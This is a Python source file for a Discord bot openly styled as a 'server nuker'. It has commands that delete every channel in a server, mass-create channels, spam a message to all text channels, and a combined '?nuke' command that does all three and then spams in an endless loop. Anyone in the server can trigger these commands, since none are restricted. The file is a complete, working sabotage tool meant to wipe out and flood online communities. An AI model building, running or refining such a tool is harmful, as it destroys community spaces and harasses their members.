import discord
import asyncio
import os
from rich.console import Console
from rich.text import Text

def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')

def interpolate_color(start, end, factor):
    return tuple(int(start[i] + (end[i] - start[i]) * factor) for i in range(3))

def rgb_to_hex(rgb):
    return f"#{rgb[0]:02x}{rgb[1]:02x}{rgb[2]:02x}"

def gradient_ascii(text, start_color=(128, 0, 128), end_color=(255, 255, 255)):
    lines = text.split("\n")
    gradient_text = Text()
    
    for i, line in enumerate(lines):
        factor = i / max(len(lines) - 1, 1)
        color = rgb_to_hex(interpolate_color(start_color, end_color, factor))
        gradient_text.append(line + "\n", style=color)

    return gradient_text

MENU = """
                                         _   __      __
      ________  ______   _____  _____   / | / /_  __/ /_____  _____
     / ___/ _ \/ ___/ | / / _ \/ ___/  /  |/ / / / / //_/ _ \/ ___/
    (__  )  __/ /   | |/ /  __/ /     / /|  / /_/ / ,< /  __/ / 
   /____/\___/_/    |___/\___/_/     /_/ |_\/__,_/_/|_|\___/_/

                 ?Delete - Delete all channels 
                 ?Make  - Make channels  ( Channel name) 
                 ?Spam  - Spam message  ( Message) 
                 ?Nuke  - Nukes server  ( Channel name ) ( Message )

( YOU HAVE TO SAY THIS IN ANY CHANNEL OF THE SERVER )

"""

console = Console()

async def delete_channels(bot, guild_id):
    guild = bot.get_guild(guild_id)
    if not guild:
        print("Bot is not in this server or invalid ID.")
        return
    
    print(f"Deleting all channels in: {guild.name}")
    for channel in guild.channels:
        try:
            await channel.delete()
            print(f"Deleted: {channel.name}")
        except Exception as e:
            print(f"Failed to delete {channel.name}: {e}")

async def create_channels(bot, guild_id, channel_name):
    guild = bot.get_guild(guild_id)
    if not guild:
        print("Bot is not in this server or invalid ID.")
        return
    
    for i in range(30):  
        try:
            await guild.create_text_channel(f"{channel_name}-{i+1}")
            print(f"Created: {channel_name}-{i+1}")
        except Exception as e:
            print(f"Failed to create channel {channel_name}-{i+1}: {e}")

async def spam_message(bot, guild_id, message):
    guild = bot.get_guild(guild_id)
    if not guild:
        print("Bot is not in this server or invalid ID.")
        return
    
    for channel in guild.text_channels:
        try:
            await channel.send(message)
            print(f"Message sent to {channel.name}")
        except Exception as e:
            print(f"Failed to send message in {channel.name}: {e}")

async def nuke(bot, guild_id, channel_name, message):
    await delete_channels(bot, guild_id)  
    await create_channels(bot, guild_id, channel_name)
    while True:
        await spam_message(bot, guild_id, message)

class MyBot(discord.Client):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.intents.message_content = True  
    
    async def on_ready(self):
        clear_terminal()
        console.print(gradient_ascii(MENU))
        print(f"Logged in as {self.user}")

    async def on_message(self, message):
        if message.author == self.user or not message.content.strip():
            return
        
        content = message.content.split()
        if not content:
            return
        
        command = content[0].lower()
        print(f"Received command: {command}")  
        
        if command == "?delete":
            await delete_channels(self, message.guild.id)
        elif command == "?make" and len(content) > 1:
            await create_channels(self, message.guild.id, content[1])
        elif command == "?spam" and len(content) > 1:
            await spam_message(self, message.guild.id, ' '.join(content[1:]))
        elif command == "?nuke" and len(content) > 2:
            await nuke(self, message.guild.id, content[1], ' '.join(content[2:]))

bot_token = input("Enter your bot token: ")
guild_id = int(input("Enter your server ID: "))

intents = discord.Intents.default()
intents.messages = True
intents.message_content = True 
bot = MyBot(intents=intents)

bot.run(bot_token)

